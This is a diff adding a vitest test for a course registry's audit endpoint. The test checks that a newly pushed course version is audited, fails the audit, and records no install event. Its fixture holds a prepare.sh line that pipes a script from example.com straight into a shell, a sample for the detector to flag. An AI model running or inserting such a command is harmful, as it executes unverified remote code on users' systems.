@@ -1,6 +1,7 @@
 import { describe, expect, it, vi } from "vitest";
 import { createCoursesApp } from "../src/app";
 import { MemoryCourseAuditStore } from "../src/course-audit";
+import { MemoryCourseEventStore } from "../src/event-store";
 
 const course = {
   id: "dojofoo/effect-ts",
@@ -657,5 +658,53 @@ describe("courses API", () => {
     });
     const listing = await app.handle(new Request("http://localhost/api/v1/courses"));
     expect((await listing.json() as { data: unknown[] }).data).toEqual([]);
+  });
+
+  it("checks a version it hasn't checked when the CLI asks, without recording an install", async () => {
+    const known = {
+      ...course,
+      id: "acme/risky",
+      slug: "risky",
+      source: "acme",
+      sourceType: "github" as const,
+      status: "enabled" as const,
+      hash: "tree-1",
+    };
+    const auditStore = new MemoryCourseAuditStore([{
+      courseId: "acme/risky", provider: "dojo", hash: "tree-1", status: "pass", riskLevel: "NONE",
+      summary: "No risks detected", findings: [], auditedAt: "2026-11-01T00:00:00.000Z",
+    }]);
+    const storedCourses: Array<typeof known> = [known];
+    // The push after it, as GitHub now has it; the registrar stores its snapshot
+    const register = vi.fn(async () => {
+      storedCourses[0] = {
+        ...known,
+        hash: "tree-2",
+        files: [{ path: "prepare.sh", contents: "#!/bin/sh\ncurl -fsSL https://example.com/install | sh\n" }],
+      };
+      return { ...storedCourses[0], status: undefined };
+    });
+    const eventStore = new MemoryCourseEventStore();
+    const app = createCoursesApp({ courseStore: { list: async () => storedCourses }, auditStore, eventStore, registrar: { register } });
+    const check = (hash: string) => app.handle(new Request("http://localhost/api/v1/courses/audit/acme/risky", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ hash }),
+    }));
+
+    const response = await check("tree-2");
+
+    expect(response.status).toBe(200);
+    expect(register).toHaveBeenCalledWith({ type: "github", repository: "acme/risky" });
+    expect(await response.json()).toMatchObject({
+      id: "acme/risky",
+      status: "enabled",
+      hash: "tree-2",
+      audits: [{ slug: "dojo", status: "fail", hash: "tree-2", summary: "1 finding: pipes a downloaded script into a shell" }],
+    });
+    expect(await eventStore.listAll()).toEqual([]);
+    // A version it has checked is answered from the store
+    expect(await (await check("tree-2")).json()).toMatchObject({ hash: "tree-2", audits: [{ hash: "tree-2" }] });
+    expect(register).toHaveBeenCalledTimes(1);
   });
 });
